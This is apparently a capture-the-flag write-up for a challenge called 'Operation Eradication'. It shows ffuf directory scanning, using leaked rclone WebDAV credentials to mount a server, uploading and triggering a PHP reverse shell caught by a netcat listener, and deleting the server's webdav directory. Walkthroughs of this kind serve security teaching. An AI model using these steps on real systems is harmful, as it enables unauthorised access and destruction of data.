# Operation Eradication


## Description

```
Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!

Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
```

## Writeup

Starting off I downloaded the file and got the following content. <br/>
```yml
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

After seeing this I took a look at the website. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/1a522ce5-f441-4b79-921a-52d945c60ac9)

Directory Scan: <br/>
```sh
ffuf -u http://chal.ctf.games:32072/FUZZ -w ../../webhacking/wordlists/directory_scanner/common.txt     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://chal.ctf.games:32072/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 3602ms]
    * FUZZ: .hta

[Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 4507ms]
    * FUZZ: .htaccess

[Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 5000ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 740, Words: 58, Lines: 17, Duration: 187ms]
    * FUZZ: index.php

[Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 147ms]
    * FUZZ: server-status

[Status: 401, Size: 464, Words: 42, Lines: 15, Duration: 151ms]
    * FUZZ: webdav

:: Progress: [4613/4613] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```

Seems like I found `/webdav`. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/a8d11610-fff5-40f2-8995-a02c70067bc5)

Trying to access it I got a login prompt which was not accessable with default credentials. <br/>
After some researching I found that the configuration file I got in the beginning matches a Tool to connect to webdav. <br/>

Knowing that I tried to import the configuration file and change it up a bit. <br/>
```yml
[yeet]
type = webdav
url = http://chal.ctf.games:32072
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Using this I executed the command: <br/>
```sh
kali@kali rclone ls yeet:/webdav/             
  3510400 HumanResources/EmployeeHandbook.pdf
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
  3210830 ProductDevelopment/Designs/UpdatedProductDesign.pdf
--------------------------------------------------------------
```

Seems like this worked and I can connect to the machine with this tool. <br/>

Using `rclone` we can than mount the whole /webdav/ directory into one of our own. <br/>
```sh
kali@kali rclone mount yeet:/webdav/ ./mounted_dir

kali@kali ls mounted_dir/
Accounting  HumanResources  Legal      Operations          Sales   remover.sh
Finance     IT              Marketing  ProductDevelopment  del.sh  rev_shell.php
```

Now I copied a reverse shell into the mounted directory and executed it with `cat rev_shell.php`. (Don't ask me) <br/>
This opens a reverse shell on my Vserver on its public IP. <br/>
```sh
nc -lnvp 1234
listening on [any] 1234 ...


connect to [REDACTED] from (UNKNOWN) [34.123.224.68] 32070
Linux operation-eradication-266f1c7f2786d51f-8498b5d548-zbmvq 5.15.109+ #1 SMP Fri Jun 9 10:57:30 UTC 2023 x86_64 GNU/Linux
 17:22:35 up  4:18,  0 users,  load average: 0.44, 0.25, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ export TERM=xterm
```

Seems like this gave me a reverse shell so I checked the apache configuration: <br/>
```sh
$ cat /etc/apache2/sites-available/*


-----------------------------
DocumentRoot /var/www/html
-----------------------------
```

Knowing the `DocumentRoot` we can take a look at this directory. <br/>
```sh
$ ls -R /var/www/
/var/www/:
html

/var/www/html:
index.php
webdav
```

Knowing that the challenge is to delete all data in webdav I just removed the whole directory: <br/>
```sh
$ rm -r webdav/ 
```

Now I take a look at the website again where I found the Flag: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/4a06acb0-4cbb-4cc5-912b-70dcf15a924c)




